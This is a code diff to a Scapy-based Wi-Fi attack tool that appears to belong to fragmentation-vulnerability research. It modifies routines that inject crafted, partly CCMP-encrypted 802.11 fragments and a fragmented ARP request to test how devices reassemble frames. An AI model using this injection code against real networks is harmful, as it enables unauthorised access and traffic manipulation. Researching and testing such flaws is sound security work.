@@ -84,16 +84,23 @@ class Station():
 
 	def handle_eth_rx(self, p):
 		if self.state == Station.ATTACKING and self.options.test == TestOptions.Inject_Ping:
+			# TODO XXX --- Make sure this is not a packet send by us!
 			if ARP in p and p[ARP].pdst == self.ip:
 				log(STATUS, "Received reply to (fragmented?) ARP request!", color="green")
 				self.state = Station.DONE
 
-	def set_header(self, p, forward=False):
+	def set_header(self, p, forward=False, prior=None):
 		"""Set addresses to send frame to the peer or the 3rd party station."""
 		# Forward request only makes sense towards the DS/AP
 		assert (not forward) or ((p.FCfield & 1) == 0)
+		# Priority is only supported in data frames
+		assert (prior == None) or (p.type == 2)
 
 		p.FCfield |= self.FCfield
+		if prior:
+			p.subtype = 8
+			p.add_payload(Dot11QoS(TID=prior))
+
 		destmac = self.othermac if forward else self.peermac
 		p.addr1 = self.peermac
 		p.addr2 = self.mac
@@ -101,13 +108,14 @@ class Station():
 		# represents the final destination. Otherwise its the BSSID.
 		p.addr3 = destmac if p.FCfield & 1 else self.mac
 
+
 	def fragattack_linux(self):
 		assert self.tk
 
 		payload1 = b"A" * 16
 		payload2 = b"B" * 16
 		payload3 = b"C" * 16
-		seqnum = 0xAA
+		seqnum = 0x6AA
 
 		# Frame 1: encrypted normal fragment
 		frag1 = Dot11(type="Data", FCfield="MF", SC=(seqnum << 4) | 0)/Raw(payload1)
@@ -129,7 +137,7 @@ class Station():
 		for frag in [frag1, frag2, frag3]:
 			self.daemon.inject_mon(frag)
 
-	def send_fragmented(self, header, data, num_frags, tx_repeats=1):
+	def send_fragmented(self, header, data, num_frags, tx_repeats=2):
 		data = raw(data)
 		fragments = []
 		fragsize = (len(data) + 1) // num_frags
@@ -141,7 +149,7 @@ class Station():
 
 			payload = data[fragsize * i : fragsize * (i + 1)]
 			frag = frag/Raw(payload)
-			if self.tk:
+			if self.tk and i < 20:
 				frag = encrypt_ccmp(frag, self.tk, self.pn)
 				self.pn += 1
 			print(repr(frag))
@@ -151,13 +159,13 @@ class Station():
 			for frag in fragments:
 				self.daemon.inject_mon(frag)
 
-	def inject_fragments(self, num_frags=3, size=3000, data=None):
+	def inject_fragments(self, num_frags=3, size=3000, data=None, prior=None):
 		if data is None:
 			data = b"A" * size
 
 		seqnum = 0xAA
 		header = Dot11(type="Data", SC=(seqnum << 4))
-		self.set_header(header)
+		self.set_header(header, prior=prior)
 		self.send_fragmented(header, data, num_frags)
 
 	def inject_eapol(self, numbytes=16, forward=False):
@@ -196,7 +204,7 @@ class Station():
 			log(STATUS, "self.peerip: " + self.peerip)
 			request = ARP(op=1, hwsrc=self.mac, psrc=self.ip, hwdst=self.peermac, pdst=self.peerip)
 
-			self.inject_fragments(num_frags=2, data=LLC()/SNAP()/request)
+			self.inject_fragments(num_frags=1, data=LLC()/SNAP()/request, prior=2)
 			#self.daemon.inject_eth(Ether(src=self.mac, dst=self.peermac)/request)
 
 			self.state = Station.ATTACKING
